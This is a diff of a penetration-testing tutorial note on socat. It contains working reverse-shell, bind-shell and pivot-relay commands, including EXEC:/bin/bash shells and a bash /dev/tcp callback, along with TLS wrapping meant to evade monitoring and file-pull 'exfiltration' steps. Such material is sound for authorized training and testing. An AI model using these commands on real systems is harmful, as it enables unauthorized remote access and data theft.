@@ -1,10 +1,9 @@
 ---
 created: 2026-09-05
-updated: 2026-09-12
+updated: 2026-10-06
 tags:
   - pivoting
 ---
->[!abstract]+ **Scope**: `socat`; address types and options; using `socat` for: TCP forwarding, catching a reverse shell through a pivot, relaying a bind shell out through a pivot, building a fully interactive TTY shell, wrapping a relay in TLS.
 ## `socat`
 
 >**[`socat`](http://www.dest-unreach.org/socat/doc/socat.html) (Socket Cat)** is a multipurpose command-line tool for **bidirectional data transfer** between **two independent data channels**.
@@ -19,10 +18,8 @@ tags:
 	- Pseudo terminals
 	- File descriptors
 	- Pipes
-
-- This comes useful for pivoting, when you get a foothold on a host that can reach a target you can't reach directly. You drop `socat` on the pivot and use it to bridge traffic from your host across the network boundary and back.
-
-## Using `socat`
+- This is useful for pivoting: when you get a foothold on a host that can reach a target you can't reach directly, you drop `socat` on the pivot and use it to bridge traffic across the network boundary and back.
+### Using `socat`
 
 - Command syntax:
 
@@ -30,40 +27,168 @@ tags:
 socat [options] <address_1> <address_2>
 ```
 
-- Each `<address>` specifies an endpoing: a protocol type followed by its parameters and comma-separated options. 
+- Each `<address>` specifies an endpoint: a protocol type followed by its parameters and comma-separated options. 
 - `socat` creates both endpoints and copies bytes between them in both directions.
 
-| Address type                      | Description                                                                                                                          |
-| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
-| `TCP`, `TCP4`, `TCP6`             | TCP client connection (dual-stack, IPv4-only, IPv6-only).                                                                            |
-| `UDP`                             | UDP client connection.                                                                                                               |
-| `TCP-LISTEN`                      | Listens on a local TCP port for an incoming connection.                                                                              |
-| `UDP-LISTEN`                      | Listens on a local UDP port.                                                                                                         |
-| `OPENSSL`                         | TLS client connection.                                                                                                               |
-| `OPENSSL-LISTEN`                  | Listens on a TCP port and acts as a TLS server.                                                                                      |
-| `EXEC`                            | Runs a command and connects its `stdin`/`stdout` to the data stream (used for shells).                                               |
-| `STDIO`                           | Uses the current terminal's `stdin`/`stdout` as the endpoint.                                                                        |
-| `PIPE`                            | Connects to a named pipe (FIFO, First-In First-Out).                                                                                 |
-| `TUN`                             | Creates a TUN/TAP virtual network interface.                                                                                         |
-| `SOCKS4`, `SOCKS4A`               | Connects through a **SOCKS4/4A proxy as a client**.                                                                                  |
-| `SOCKS5-CONNECT`, `SOCKS5-LISTEN` | Connects through a **SOCKS5 proxy client**; `SOCKS5-LISTEN` is also client-side — it asks the SOCKS5 server to listen on its behalf. |
+>[!note] Global options (e.g., `-u`, `-d`) go _before_ the addresses.
 
-- Common per-address options (specified comma-separated, after the address type):
+>[!note] `-` is shorthand for `STDIO` — the current terminal's `stdin`/`stdout`.
+## `socat` bind and reverse shells
 
-| Option          | Description                                                                                                                                                                                                                                                               |
-| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `fork`          | Spawns a child process for each new connection instead of exiting after the first one. <br>Required for any listener that should serve more than one client.                                                                                                              |
-| `reuseaddr`     | Allows the listener rebind a port still in `TIME_WAIT`.<br>Without this option, attempting to restart a socat listener on the same port will fail with an `Address already in use` error until the OS clears the time-out; `reuseaddr` allows you to restart immediately. |
-| `pty`           | Allocates a pseudo-terminal for the endpoint (needed for a fully interactive shell).                                                                                                                                                                                      |
-| `stderr`        | Redirects the child process's `stderr` into the relay stream too (error messages reach the remote session instead of only appearing on the pivot's local console).                                                                                                        |
-| `setsid`        | Runs the process in a new session, detached from the controlling terminal.                                                                                                                                                                                                |
-| `sigint`        | Passes `SIGINT` (`Ctrl+C`) through to the relayed process instead of killing the `socat` process itself.                                                                                                                                                                  |
-| `sane`          | Restores sane terminal settings after `pty` allocation.                                                                                                                                                                                                                   |
-| `crlf`          | Translates line endings between LF and CRLF.                                                                                                                                                                                                                              |
-| `cert=`, `key=` | Path to a TLS certificate and private key — commonly set on `OPENSSL-LISTEN`, but also valid on the `OPENSSL` client address when client-certificate authentication is required.                                                                                          |
-| `verify=`       | Whether to verify the peer's TLS certificate (`0` disables verification).                                                                                                                                                                                                 |
+### Reverse shells
 
-### TCP port forwarding
+```mermaid
+flowchart LR;
+A["Attacker<br>10.10.11.11"]<-..->C["Target<br>10.10.11.5"]
+```
+
+1. On your **attacking machine**, start a listener:
+
+```bash
+socat TCP-LISTEN:1337,reuseaddr -
+```
+
+2. From the **target machine**, connect to the listener:
+
+```bash
+socat TCP:10.10.11.11:1337 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+> [!note]+ Fully interactive TTY
+> 
+> - The `EXEC` option set makes the shell fully interactive:
+> 
+> | Option   | Description                                                                                 |
+> | -------- | ------------------------------------------------------------------------------------------- |
+> | `pty`    | Allocate a pseudo-terminal (PTY) with a proper prompt, tab completion, and command history. |
+> | `stderr` | Merge the child's error stream into the output stream.                                      |
+> | `setsid` | Detach the child process from the controlling terminal.                                     |
+> | `sigint` | Forward `Ctrl+C` to the shell instead of killing the `socat` process itself.                |
+> | `sane`   | Reset the PTY to sane terminal settings.                                                    |
+
+>[!tip]+ 
+>- On a Windows machine, use:
+> ```bash
+> socat.exe TCP:10.10.11.11:1337 EXEC:"C:\Windows\System32\cmd.exe",pipes
+> ```
+
+#### Encrypted reverse shells
+
+1. On your **attacking machine**, generate a self-signed certificate:
+
+```bash
+openssl req -x509 -newkey rsa:2048 -noenc -days 365 -subj "/CN=localhost" -keyout shell.key -out shell.crt
+```
+
+>[!note]- `openssl` options
+> 
+> | Option             | Description                                       |
+> | ------------------ | ------------------------------------------------- |
+> | `req`              | Request certificate generation.                   |
+> | `-x509`            | Generate an X.509 certificate instead of a CSR.   |
+> | `-newkey rsa:2048` | Generate a new 2048-bit RSA private key.          |
+> | `-noenc`           | Do not encrypt the private key with a passphrase.<br>For OpenSSL versions `<3.0`, use `-nodes` instead.|
+> |`-subj "/CN=..."` | Set the subject non-interactively; otherwise `openssl` prompts for certificate fields. | 
+> | `-days`            | Certificate validity period, in days.             |
+> | `-keyout`          | File to write the private key to.                 |
+> | `-out`             | File to write the certificate to.                 |
+
+2. Create a combined PEM file:
+
+```bash
+cat shell.crt shell.key > shell.pem
+```
+
+3. Start a TLS listener:
+
+```bash
+socat OPENSSL-LISTEN:1337,reuseaddr,cert=shell.pem,verify=0
+```
+
+4. From the **target machine**, connect to the listener over TLS:
+
+```bash
+socat OPENSSL:10.10.11.11:1337,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+
+> [!note] `verify=0` disables certificate validation. It's required with self-signed certificates, on both the listener and the client.
+
+### Bind shells
+
+
+```mermaid
+flowchart LR;
+A["Attacker<br>10.10.11.11"]<-..->C["Target<br>10.10.11.5"]
+```
+
+1. On the **target machine**, start a listener:
+
+```bash
+socat TCP-LISTEN:1337,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+>[!tip]+
+>- On a Windows target, use:
+>```powershell
+>socat.exe TCP-LISTEN:1337,reuseaddr,fork EXEC:"C:\Windows\System32\cmd.exe",pipes
+>```
+
+2. From your **attacking machine**, connect to the listener:
+
+```bash
+socat - TCP:10.10.11.5:1337
+```
+
+```bash
+nc 10.10.11.5 1337
+```
+
+> [!note] The interactive TTY comes from the options on the `EXEC` side, not from your client; plain `nc` connects just as well.
+#### Encrypted bind shells
+
+1. On the **target machine**, generate a self-signed certificate:
+
+```bash
+openssl req -x509 -newkey rsa:2048 -noenc -days 365 -subj "/CN=localhost" -keyout shell.key -out shell.crt
+```
+
+>[!note]- `openssl` options
+> 
+> | Option             | Description                                       |
+> | ------------------ | ------------------------------------------------- |
+> | `req`              | Request certificate generation.                   |
+> | `-x509`            | Generate an X.509 certificate instead of a CSR.   |
+> | `-newkey rsa:2048` | Generate a new 2048-bit RSA private key.          |
+> | `-noenc`           | Do not encrypt the private key with a passphrase.<br>For OpenSSL versions `<3.0`, use `-nodes` instead.|
+> |`-subj "/CN=..."` | Set the subject non-interactively; otherwise `openssl` prompts for certificate fields. | 
+> | `-days`            | Certificate validity period, in days.             |
+> | `-keyout`          | File to write the private key to.                 |
+> | `-out`             | File to write the certificate to.                 |
+
+2. Create a combined PEM file:
+
+```bash
+cat shell.crt shell.key > shell.pem
+```
+
+3. Start a TLS listener:
+
+```bash
+socat OPENSSL-LISTEN:1337,reuseaddr,fork,cert=shell.pem,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+4. From your **attacking machine**, connect to the listener over TLS:
+
+```bash
+socat - OPENSSL:10.10.11.5:1337,verify=0
+```
+
+> [!note] `verify=0` disables certificate validation. It's required with self-signed certificates, on both the listener and the client.
+
+## `socat` for pivoting
+
+- A pivot host acts as an intermediary between your attacking machine and the target network: you can reach the pivot, the pivot can reach the target, but you can't reach the target directly. You can use `socat` as a bridge between the two.
 
 ```mermaid
 flowchart LR;
@@ -72,20 +197,29 @@ A["Attacker<br>10.10.11.11"]<-..->B["Pivot<br>10.10.11.5<br>172.16.5.5"]
 B<-..->C["Target<br>172.16.5.19"]
 ```
 
-- TCP port forwarding through a pivot (run on the pivot host):
+>[!tip]+
+> - Most targets won't have `socat` installed.
+> - [`socat static binary for Linux`](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat):
+> 
+> ```bash
+> wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/socat
+> ```
+#### TCP port forwarding
+
+1. On the **pivot host**, forward a local port to the target service:
 
 ```bash
 socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.5.19:80
 ```
 
-- Whenever you connect to the listener on the pivot (e.g., `10.10.11.5:8080`), the traffic is redirected to `172.15.5.19:80`.
-- For example, `curl` to the listener ends up talking directly to the forwarded port (`172.16.5.19:80`), as if the internal web server were hosted directly on the pivot.
+- Whenever you connect to the listener on the pivot (`10.10.11.5:8080`), the traffic is redirected to `172.16.5.19:80`.
+- From your point of view, the internal service appears to be hosted directly on the pivot:
 
 ```bash
 curl -I http://10.10.11.5:8080/
 ```
 
-- The same pattern applies for other TCP services — replace the port and target accordingly.
+- The same pattern works for any TCP service — change the ports on both sides:
 
 ```bash
 socat TCP-LISTEN:3307,fork,reuseaddr TCP:172.16.5.19:3306
@@ -94,119 +228,223 @@ socat TCP-LISTEN:3307,fork,reuseaddr TCP:172.16.5.19:3306
 ```bash
 mysql -h 10.10.11.5 -P 3307 -u root -p
 ```
-### Relaying a reverse shell through a pivot
 
-```mermaid
-flowchart LR;
 
-A["Attacker<br>10.10.11.11<br>"]<-..->B["Pivot<br>10.10.11.5<br>172.16.5.5"]
-B<-..->C["Target<br>172.16.5.19"]
-```
+> [!tip]+ 
+> 
+> - By default, a listener on the pivot is open to anyone who can reach it. 
+> - To specify a listening interface and filter clients:
+> 
+> ```bash
+> socat TCP-LISTEN:8080,fork,reuseaddr,bind=10.10.11.5,range=10.10.11.11/32 TCP:172.16.5.19:80
+> ```
+> 
+> - `bind=` — bind the listener to a specific local IP instead of all interfaces.
+> - `range=` — only accept connections from the given source range.
 
-1. On your attacker machine, start a listener:
+#### Relaying a reverse shell through a pivot
+
+1. On your **attacking machine**, start a catch listener:
 
 ```bash
-nc -lvnp 4444
+nc -lvnp 1337
 ```
 
-2. On the pivot host, use `socat` to start another listener that relays any connections to the listener on your machine:
+2. On the **pivot host**, start a listener that relays connections to your catch listener:
 
 ```bash
-socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.11.11:4444
+socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.11.11:1337
 ```
 
-3. On the internal target, trigger a reverse shell pointed at the pivot's internal IP address and the forwarding port:
+3. On the **internal target**, trigger a reverse shell pointed at the pivot's _internal_ IP address and the forwarding port:
 
 ```bash
 bash -i >& /dev/tcp/172.16.5.5/8080 0>&1
 ```
 
-- The internal host connects to the pivot, and the pivot forwards that connection to your listener — you end up with a shell.
-
+- The internal target connects to the pivot, and the pivot forwards that connection to your listener — you end up with a shell.
+- The target itself needs nothing but `bash` for this; you don't need `socat` on it. But if you _can_ stage `socat` (or Python) there, use it to set up a fully interactive shell (pointed at the pivot's `172.16.5.5:8080`).
 ### Relaying a bind shell through a pivot
 
-```mermaid
-flowchart LR;
-
-A["Attacker<br>10.10.11.11<br>"]<-..->B["Pivot<br>10.10.11.5<br>172.16.5.5"]
-B<-..->C["Target<br>172.16.5.19"]
-```
-
-1. Start a bind shell listener on the internal target, such as at `172.16.5.18:4444`.
-2. On the pivot host, forward a local port to the bind listener port on the target:
+1. On the **internal target**, start a bind shell listener:
 
 ```bash
-socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.5.19:4444
+socat TCP-LISTEN:1337,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
-3. From your attacking machine, connect to the forwarding port on the pivot:
+- Any bind shell works here (such as `socat`, `netcat`, `python`, `perl`), the pivot just needs something listening on the target.
+
+2. On the **pivot host**, forward a local port to the bind listener on the target:
+
+```bash
+socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.5.19:1337
+```
+
+3. From your **attacking machine**, connect to the forwarding port on the pivot:
 
 ```bash
 nc 10.10.11.5 8080
 ```
 
-### Fully interactive TTY reverse shell
+### Wrapping connections in TLS
 
-- The `pty` option, combined with `stderr`, `setsid`, `sigint`, and `sane`, gives you a fully interactive shell — with job control, signal handling, error redirection, and sane terminal settings.
+- `socat` can encrypt the traffic between your attacking machine and the target.
+- To encrypt a listener side (`TCP-LISTEN:PORT,fork,reuseaddr`):
 
-1. On your attacking machine, start the listener:
-
-```bash
-socat TCP-LISTEN:4444,fork,reuseaddr -
+```
+OPENSSL-LISTEN:PORT,fork,reuseaddr,cert=shell.pem,verify=0
 ```
 
-2. On the target (or using pivot redirection as described above), connect back to your listener and hand off a `pty`-backed shell:
+- To encrypt a client side (`TCP:<IP_address>:<port>`):
 
 ```bash
-socat TCP:10.10.11.11:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+OPENSSL:<IP_address>:<port>,verify=0
 ```
 
-- `EXEC:/bin/bash` runs `/bin/bash` and pipes its `stdin` and `stdout` through the `pty` into the network connection, so you get a proper prompt with tab completion and friends, instead of a raw, fragile pipe.
+- The certificate always resides on the **listener** side.
+- The relay in the middle doesn't need to understand TLS; it just shuffles bytes.
+#### Encrypted reverse-shell through the pivot
 
-### Wrapping a relay in TLS
-
-- Cleartext connections can be inspected by any network monitoring tools sitting between the pivot and your attacking machine. Wrapping the relay in TLS hides your traffic, which, in many cases, prevents detection (and doesn't take much hastle).
-
-1. On your attacking machine, generate a self-signed certificate and private key; then combine them into a single PEM file:
+1. On your **attacking machine**, generate a certificate and PEM file (same commands as above):
 
 ```bash
-openssl req -x509 -newkey rsa:2048 -days 365 -nodes -out cert.pem -keyout key.pem
+openssl req -x509 -newkey rsa:2048 -noenc -days 365 -subj "/CN=localhost" -keyout shell.key -out shell.crt
 ```
 
 ```bash
-cat cert.pem key.pem > server.pem
+cat shell.crt shell.key > shell.pem
 ```
 
-2. On your attacking machine, start a TLS listener; specify the generated certificate in the `cert` option:
+2. Start the catch listener:
 
 ```bash
-socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork,reuseaddr TCP:127.0.0.1:4444
+nc -lvnp 1337
 ```
 
-3. On the pivot host, forward internal traffic to your attacking machine over the encrypted link:
+3. Put TLS in front of it (terminate TLS and relay plaintext traffic to the local listener):
+
+```bash
+socat OPENSSL-LISTEN:443,fork,reuseaddr,cert=shell.pem,verify=0 TCP:127.0.0.1:1337
+```
+
+4. On the **pivot host**, relay the internal callback to your machine over the encrypted link:
 
 ```bash
 socat TCP-LISTEN:8080,fork,reuseaddr OPENSSL:10.10.11.11:443,verify=0
 ```
 
->[!important] `verify=0` disables certificate validation on the client side; this is necessary since you're using self-signed certificates.
-
-### File transfers
-
-1. On the machine from which you want to transfer a file (e.g., your attacking machine), start a listener:
+5. On the **internal target**, trigger the reverse shell at the pivot:
 
 ```bash
-socat TCP4-LISTEN:443,fork file:example.txt
+bash -i >& /dev/tcp/172.16.5.5/8080 0>&1
 ```
 
-2. On the machine to which your want to transfer the file (e.g., target host or pivot), relay the file using `socat`:
+> [!important] `verify=0` disables certificate validation on the client side; this is necessary when using self-signed certificates.
+
+>[!note] In this chain only the pivot → attacker leg is TLS; the target → pivot leg stays plaintext. That's usually acceptable on internal networks — and if you want it encrypted too, apply the same swap on that leg.
+
+- The same swap gives you an **end-to-end encrypted bind shell through the pivot**: TLS listener on the internal target (encrypted bind shells section), plain TCP forward on the pivot, and `socat - OPENSSL:10.10.11.5:8080,verify=0` from your machine. The relay sees only ciphertext.
+## File transfers
+
+- `socat` can be used for files transfers as well: point one address at a file and the other at a socket.
+
+ >[!note] `socat` transfers are binary-safe; you can copy executables and images same as text.
+### Pushing files to the target
+
+1. On the machine _sending_ the file (such as your attacking machine), start a listener pointing to the target files as the source:
 
 ```bash
-socat TCP4:10.10.11.11:443 file:example.txt,create
+socat TCP-LISTEN:1337,reuseaddr file:payload.txt
 ```
-## Option reference
 
-- Global `socat` flags:
+2. On the machine *receiving* the file (such as the target machine), connect to the listener and write the file to disk:
+
+```bash
+socat TCP:10.10.11.11:1337 file:payload.txt,create
+```
+
+> [!note]+ `create` creates the destination file if it doesn't exist.
+
+>[!note] `socat` exits when the file hits EOF. Use `fork` on the listener to serve multiple downloads.
+### Pulling files from the target
+
+1. On the machine _receiving_ the file (such as your attacking machine), start a listener with `create`:
+
+```bash
+socat TCP-LISTEN:1337,reuseaddr file:loot.txt,create
+```
+
+2. On the machine _sending_ the file (such as the target machine), connect with the file as the source:
+
+```bash
+socat TCP:10.10.11.11:1337 file:loot.txt
+```
+
+ >[!note] Swap `TCP` for `OPENSSL` to encrypt an exfiltration.
+
+## Command syntax reference
+
+### `socat` address types
+
+| Address type                      | Description                                                                                                                                        |
+| --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `-`                               | Shorthand for `STDIO` — your terminal's `stdin`/`stdout`, used to interact with the other endpoint.                                                |
+| `TCP`, `TCP4`, `TCP6`             | TCP client connection (dual-stack, IPv4-only, IPv6-only).                                                                                          |
+| `UDP`                             | UDP client connection.                                                                                                                             |
+| `TCP-LISTEN`                      | Listens on a local TCP port for incoming connections.                                                                                              |
+| `UDP-LISTEN`                      | Listens on a local UDP port.                                                                                                                       |
+| `OPENSSL`                         | TLS client connection.                                                                                                                             |
+| `OPENSSL-LISTEN`                  | Listens on a TCP port and acts as a TLS server.                                                                                                    |
+| `EXEC`                            | Runs a command and connects its `stdin`/`stdout` to the data stream (used for shells). Quote the command if it contains spaces.                    |
+| `SYSTEM`                          | Runs a command via `/bin/sh -c` — allows shell syntax like pipes and redirects.                                                                    |
+| `file:`                           | Reads from / writes to a file (file transfers; combine with `create` when writing).                                                                |
+| `STDIO`                           | Explicit form of `-` (the current terminal's `stdin`/`stdout`).                                                                                    |
+| `PIPE`                            | Connects to a named pipe (FIFO, First-In First-Out).                                                                                               |
+| `TUN`                             | Creates a TUN/TAP virtual network interface.                                                                                                       |
+| `SOCKS4`, `SOCKS4A`               | Connects through a SOCKS4/4A proxy as a client.                                                                                                    |
+| `SOCKS5-CONNECT`, `SOCKS5-LISTEN` | `SOCKS5-CONNECT` reaches a target through a SOCKS5 proxy; `SOCKS5-LISTEN` is also client-side — it asks the SOCKS5 server to listen on its behalf. |
+
+### `socat` address options
+
+>[!note] Options are specified comma-separated, after the address type (e.g., `TCP-LISTEN:1337,fork,reuseaddr`).
+
+- Listener options (`TCP-LISTEN`, `UDP-LISTEN`, `OPENSSL-LISTEN`):
+
+| Option         | Description                                                                                                                                                                                                                              |
+| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `fork`         | Spawn a child process for each new connection instead of exiting after the first one.<br>Required for any listener that should serve more than one client — or survive a disconnect.                                                     |
+| `reuseaddr`    | Allow the listener to rebind a port still in `TIME_WAIT`.<br>Without this option, restarting a listener on the same port fails with `Address already in use` until the OS clears the time-out; `reuseaddr` lets you restart immediately. |
+| `bind=<ip>`    | Bind the listener to a specific local IP address/interface instead of all of them (e.g., only the pivot's external NIC).                                                                                                                 |
+| `range=<cidr>` | Only accept connections from the given source range (e.g., `range=10.10.11.11/32`).                                                                                                                                                      |
+
+- Shell options (`EXEC`):
+
+| Option   | Description                                                                                                           |
+| -------- | --------------------------------------------------------------------------------------------------------------------- |
+| `pty`    | Allocate a pseudo-terminal for the spawned program (needed for a fully interactive shell).                            |
+| `stderr` | Send the child's `stderr` into the data stream too (errors reach your session instead of the target's local console). |
+| `setsid` | Run the child in a new session, detached from the controlling terminal.                                               |
+| `sigint` | Pass `SIGINT` (`Ctrl+C`) through to the child instead of killing the `socat` process itself.                          |
+| `sane`   | Restore sane terminal settings after `pty` allocation.                                                                |
+| `pipes`  | Use unnamed pipes for interprocess communication instead of a socket pair — the Windows alternative to `pty`.         |
+
+- TLS options (`OPENSSL`, `OPENSSL-LISTEN`):
+
+| Option          | Description                                                                                                                                                                                  |
+| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `cert=<file>`   | Path to a PEM certificate (usually cert and key bundled into one file) — set on `OPENSSL-LISTEN`, and on `OPENSSL` when client-certificate authentication is required.                        |
+| `key=<file>`    | Path to the TLS private key, when not bundled into `cert=`.                                                                                                                                  |
+| `verify=`       | Whether to verify the peer's TLS certificate (`0` disables verification). Required with self-signed certificates, on both sides.                                                              |
+- Other address options:
+
+| Option   | Description                                                                  |
+| -------- | ---------------------------------------------------------------------------- |
+| `crlf`   | Translate line endings between LF and CRLF.                                  |
+| `create` | Create the target file if it doesn't exist (used with `file:` when writing). |
+
+### `socat` global options
+
+- Flags placed before the two addresses:
 
 | Option                       | Description                                                                                          |
 | ---------------------------- | ---------------------------------------------------------------------------------------------------- |
@@ -215,35 +453,22 @@ socat TCP4:10.10.11.11:443 file:example.txt,create
 | `-d`, `-dd`, `-ddd`, `-dddd` | Increase log verbosity one level per `-d` (warning → notice → info → debug).                         |
 | `-d0`                        | Print only fatal and error messages — restores the pre-1.7.4 default verbosity.                      |
 | `-D`                         | Log information about the file descriptors before starting the transfer phase.                       |
-| `-u`                         | Unidirectional mode, `<address1>` → `<address2>` only.                                               |
-| `-U`                         | Unidirectional mode in reverse, `<address2>` → `<address1>` only.                                    |
+| `-u`                         | Unidirectional mode, `<address_1>` → `<address_2>` only.                                             |
+| `-U`                         | Unidirectional mode in reverse, `<address_2>` → `<address_1>` only.                                  |
 | `-b <size>`                  | Set the data transfer block size (bytes per step; default 8192).                                     |
-| `-t <timeout>`               | Seconds to wait before closing the second channel after one channel reaches EOF.                     |
+| `-t <timeout>`               | Seconds to wait before closing the second channel after one channel reaches EOF (default 0.5).       |
 | `-T <timeout>`               | Total inactivity timeout — terminate after `<timeout>` seconds with no data transferred in the loop. |
 | `-lf <file>`                 | Write log output to a file instead of stderr.                                                        |
 | `-ly`                        | Send log output to syslog.                                                                           |
 
-- Address options used in the procedures above:
-
-| Option        | Description                                                                                                                                                                                  |
-| ------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `fork`        | Spawn a child process per connection; required for a listener to serve multiple clients.                                                                                                     |
-| `reuseaddr`   | Allow rebinding a port still in `TIME_WAIT`.                                                                                                                                                 |
-| `pty`         | Allocate a pseudo-terminal for the endpoint.                                                                                                                                                 |
-| `stderr`      | Include the relayed process's stderr in the data stream.                                                                                                                                     |
-| `setsid`      | Detach into a new session.                                                                                                                                                                   |
-| `sigint`      | Pass `SIGINT` through to the relayed process.                                                                                                                                                |
-| `sane`        | Restore sane terminal settings after `pty` allocation.                                                                                                                                       |
-| `crlf`        | Translate line endings between LF and CRLF.                                                                                                                                                  |
-| `cert=<file>` | TLS certificate (and, combined with the key, usually a single PEM) — commonly set on `OPENSSL-LISTEN`, but also valid on the `OPENSSL` client address for client-certificate authentication. |
-| `key=<file>`  | TLS private key, when not bundled into `cert=`.                                                                                                                                              |
-| `verify=0\|1` | Disable or enable TLS peer certificate verification.                                                                                                                                         |
 
 >[!note] See [`socat`](http://www.dest-unreach.org/socat/doc/socat.html) for a comprehensive reference.
+
 ## References and further reading
 
 - [`socat — www.dest-unreach.org`](http://www.dest-unreach.org/socat/doc/socat.html)
 - [`Socat for Pentester — Hacking Articles`](https://www.hackingarticles.in/socat-for-pentester/)
-- [`Using sockat to bridge interfaces — Marcus Folkesson`](https://www.marcusfolkesson.se/blog/using-socat-to-bridge-interfaces/)
+- [`Using socat to bridge interfaces — Marcus Folkesson`](https://www.marcusfolkesson.se/blog/using-socat-to-bridge-interfaces/)
 - [`Reverse Shell Cheat Sheet, Socat — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#socat)
 - [`Bind Shell Cheat Sheet, Socat — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#socat)
+- [`static-binaries (precompiled socat) — andrew-d, GitHub`](https://github.com/andrew-d/static-binaries)
